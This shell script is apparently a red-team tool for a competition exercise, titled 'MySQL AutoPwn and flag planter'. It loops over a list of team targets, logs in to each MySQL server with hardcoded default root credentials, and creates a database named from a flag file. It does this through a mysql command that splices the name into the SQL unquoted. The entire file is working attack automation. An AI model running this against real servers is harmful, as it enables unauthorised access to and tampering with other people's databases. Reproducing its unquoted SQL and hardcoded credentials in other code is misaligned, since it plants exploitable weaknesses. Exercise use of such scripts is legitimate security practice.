#!/bin/sh
# MySQL AutoPwn and flag planter

# Path to the targets file
TARGETS_FILE="mysql-targets.txt"

# Path to the directory containing the flag files
FLAGS_DIR="flags"

# MySQL credentials
#Default: root:password
MYSQL_USER="root"
MYSQL_PASSWORD="password"

# Loop through each line in the targets file
while IFS=',' read -r TEAM_NUMBER TARGET; do

    # Extract the IP address and port from the TARGET
    IP_PORT=$(echo "$TARGET" | awk -F':' '{print $1}')
    PORT=$(echo "$TARGET" | awk -F':' '{print $2}')
    
    # Construct the path to the flag file for the team
    FLAG_FILE="${FLAGS_DIR}/team${TEAM_NUMBER}/team${TEAM_NUMBER}_db-new-database.flag"

    # Check if the flag file exists
    if [ ! -f "$FLAG_FILE" ]; then
        echo "Flag file for team $TEAM_NUMBER not found at $FLAG_FILE"
        continue
    fi

    # Read the database name from the flag file
    # NOTE: just to be safe, only use the first 16 chars from the flag due to max length in database names
    DB_NAME=$(head -c 16 "$FLAG_FILE")

    # Attempt to login and create the database
    echo "Attempting to create database '$DB_NAME' on $IP_PORT:$PORT for team $TEAM_NUMBER..."

    mysql -h "$IP_PORT" -P "$PORT" -u "$MYSQL_USER" -p"$MYSQL_PASSWORD" -e "CREATE DATABASE $DB_NAME;"

    if [ $? -eq 0 ]; then
        echo "Database '$DB_NAME' created successfully for team $TEAM_NUMBER on $IP_PORT:$PORT"
    else
        echo "Failed to create database '$DB_NAME' for team $TEAM_NUMBER on $IP_PORT:$PORT"
    fi

done < "$TARGETS_FILE"
